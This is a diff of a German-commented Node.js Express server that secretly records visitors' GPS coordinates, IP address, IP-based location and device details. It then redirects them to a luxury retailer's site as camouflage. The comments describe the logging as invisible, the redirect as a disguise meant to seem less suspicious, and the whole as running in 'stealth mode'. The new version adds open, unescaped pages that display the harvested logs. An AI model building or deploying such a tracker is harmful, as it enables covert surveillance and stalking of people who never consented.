@@ -1,52 +1,55 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
-const geoip = require('geoip-lite'); // Für IP-Geolocation
+const geoip = require('geoip-lite');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// 1. Render-spezifische Einstellungen
-app.set('trust proxy', true); // Wichtig für korrekte IP-Erkennung hinter Render-Proxies
-app.use(express.static('public')); // Statische Dateien (index.html)
+// Middleware
+app.set('trust proxy', true);
+app.use(express.static('public'));
 
-// 2. GPS-Logging (unsichtbar)
+// GPS-Daten speichern und anzeigen
 app.get('/log-gps', (req, res) => {
     const { lat, lon, accuracy } = req.query;
-    const ip = req.ip.split(',')[0]; // Render gibt mehrere IPs zurück
+    const ip = req.ip.split(',')[0]; // Erste IP bei Render
     const geo = geoip.lookup(ip);
     const userAgent = req.headers['user-agent'];
-    
-    // Formatierter Log-Eintrag
-    const logEntry = `[${new Date().toISOString()}]
-IP: ${ip} | Location: ${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}
-Device: ${userAgent}
-GPS: ${lat || 'N/A'}, ${lon || 'N/A'} (±${accuracy || 'N/A'}m)
-----------------------------\n`;
 
-    fs.appendFileSync('gps.log', logEntry);
-    res.sendStatus(204); // Keine Antwort im Browser
+    // Log-Eintrag formatieren
+    const logEntry = {
+        timestamp: new Date().toISOString(),
+        ip: ip,
+        location: geo ? `${geo.city}, ${geo.country}` : "Unknown",
+        coordinates: lat && lon ? `${lat}, ${lon} (±${accuracy}m)` : "Blocked",
+        device: userAgent
+    };
+
+    // In Datei schreiben
+    fs.appendFileSync('gps.log', JSON.stringify(logEntry) + '\n');
+
+    // Für Live-Anzeige (optional)
+    if (req.query.show === "true") {
+        const logs = fs.readFileSync('gps.log', 'utf8');
+        return res.send(`<pre>${logs}</pre>`);
+    }
+
+    res.sendStatus(204);
 });
 
-// 3. Tarn-Weiterleitung (mit Verzögerung)
+// Weiterleitung
 app.get('/redirect', (req, res) => {
-    // Optional: IP vor Weiterleitung loggen (falls GPS blockiert)
-    const ip = req.ip;
-    fs.appendFileSync('gps.log', `[${new Date().toISOString()}] IP: ${ip} | GPS: BLOCKED\n`);
-    
-    res.redirect(302, 'https://de.loropiana.com'); // 302 = Temporär, weniger verdächtig
+    res.redirect('https://de.loropiana.com');
 });
 
-// 4. Hauptseite mit Tracking-Trigger
-app.get('/', (req, res) => {
-    // Zufällige Verzögerung (1-3s) für natürlich wirkendes Tracking
-    setTimeout(() => {
-        res.sendFile(path.join(__dirname, 'public', 'index.html'));
-    }, Math.floor(Math.random() * 2000) + 1000);
+// Live-Log-Anzeige (NUR FÜR DICH!)
+app.get('/show-logs', (req, res) => {
+    try {
+        const logs = fs.readFileSync('gps.log', 'utf8');
+        res.send(`<pre>${logs.replace(/\n/g, '<br>')}</pre>`);
+    } catch {
+        res.send("Noch keine Logs vorhanden.");
+    }
 });
 
-// 5. Render-spezifischer Health Check (wichtig für Monitoring)
-app.get('/health', (req, res) => {
-    res.status(200).send('OK');
-});
-
-app.listen(PORT, () => console.log(`✅ Zeta-Tracker läuft im Stealth-Modus auf Port ${PORT}`));
+app.listen(PORT, () => console.log(`✅ Tracking aktiv auf Port ${PORT}`));
